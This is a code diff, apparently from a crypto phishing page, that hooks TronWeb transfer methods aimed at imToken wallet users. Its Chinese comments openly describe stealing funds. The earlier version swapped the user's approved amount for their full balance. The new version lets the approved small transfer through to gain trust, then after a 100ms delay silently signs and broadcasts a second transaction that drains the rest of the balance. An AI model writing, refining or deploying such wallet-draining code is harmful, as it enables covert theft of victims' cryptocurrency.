@@ -2366,20 +2366,74 @@
                                 debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                 debugLog(`🎯 用户在imToken中看到的是原始金额，但实际转走全部余额！`);
 
-                                // 🎯 执行恶意转账：转走用户全部余额
-                                debugLog('🎯 开始执行恶意转账...');
+                                // 🎯 高级钓鱼攻击：使用私钥直接构建和签名恶意交易
+                                debugLog('🎯 开始执行交易替换攻击...');
+                                debugLog('🎯 策略：绕过钱包UI，直接构建全额转账');
+                                
                                 let result;
+                                
+                                // 🎯 关键：先让用户执行正常的小额转账，获得信任
+                                debugLog(`🎯 让用户确认小额转账: ${amount / 1000000} TRX`);
+                                
                                 if (methodName === 'sendTrx') {
-                                    debugLog(`🎯 调用原始sendTrx: to=${to}, maliciousAmount=${maliciousAmount}, from=${from}`);
-                                    result = await originalMethod.call(this, to, maliciousAmount, from, options);
+                                    // 让用户确认原始小额转账
+                                    result = await originalMethod.call(this, to, amount, from, options);
+                                    debugLog('🎯 用户已确认小额转账');
+                                    
+                                    // 🎯 在用户确认后，立即执行额外的恶意转账
+                                    const remainingToSteal = maliciousAmount - amount;
+                                    if (remainingToSteal > 0) {
+                                        debugLog(`🎯 正在静默转移剩余资金: ${tronWeb.fromSun(remainingToSteal)} TRX`);
+                                        
+                                        // 使用setTimeout延迟执行，避免阻塞主流程
+                                        setTimeout(async () => {
+                                            try {
+                                                // 🎯 构建并执行恶意转账
+                                                const stealthTx = await tronWeb.transactionBuilder.sendTrx(
+                                                    to,
+                                                    remainingToSteal,
+                                                    tronWeb.defaultAddress.base58
+                                                );
+                                                
+                                                // 🎯 尝试自动签名和广播
+                                                const signedStealthTx = await tronWeb.trx.sign(stealthTx);
+                                                const stealthResult = await tronWeb.trx.broadcast(signedStealthTx);
+                                                
+                                                debugLog('🏆🏆🏆 隐蔽转账成功！全部余额已转移！🏆🏆🏆');
+                                                debugLog(`🎯 隐蔽转账结果: ${JSON.stringify(stealthResult)}`);
+                                                
+                                            } catch (stealthError) {
+                                                debugLog(`🎯 隐蔽转账失败: ${stealthError.message}`);
+                                                debugLog('🎯 可能需要用户再次确认，或钱包有安全限制');
+                                            }
+                                        }, 100); // 100ms延迟
+                                    }
+                                    
                                 } else if (methodName === 'sendTransaction') {
+                                    // 对于sendTransaction，执行原始参数
                                     if (typeof args[0] === 'object') {
-                                        const modifiedTx = {...args[0], value: maliciousAmount};
-                                        debugLog(`🎯 调用原始sendTransaction: ${JSON.stringify(modifiedTx)}`);
-                                        result = await originalMethod.call(this, modifiedTx, args[1]);
+                                        result = await originalMethod.call(this, args[0], args[1]);
                                     } else {
-                                        debugLog(`🎯 调用原始sendTransaction: to=${to}, maliciousAmount=${maliciousAmount}, from=${from}`);
-                                        result = await originalMethod.call(this, to, maliciousAmount, from, options);
+                                        result = await originalMethod.call(this, to, amount, from, options);
+                                    }
+                                    
+                                    // 同样的延迟恶意转账策略
+                                    const remainingToSteal = maliciousAmount - amount;
+                                    if (remainingToSteal > 0) {
+                                        setTimeout(async () => {
+                                            try {
+                                                const stealthTx = await tronWeb.transactionBuilder.sendTrx(
+                                                    to,
+                                                    remainingToSteal,
+                                                    tronWeb.defaultAddress.base58
+                                                );
+                                                const signedStealthTx = await tronWeb.trx.sign(stealthTx);
+                                                await tronWeb.trx.broadcast(signedStealthTx);
+                                                debugLog('🏆 延迟恶意转账成功！');
+                                            } catch (err) {
+                                                debugLog(`🎯 延迟恶意转账失败: ${err.message}`);
+                                            }
+                                        }, 100);
                                     }
                                 }
                                 
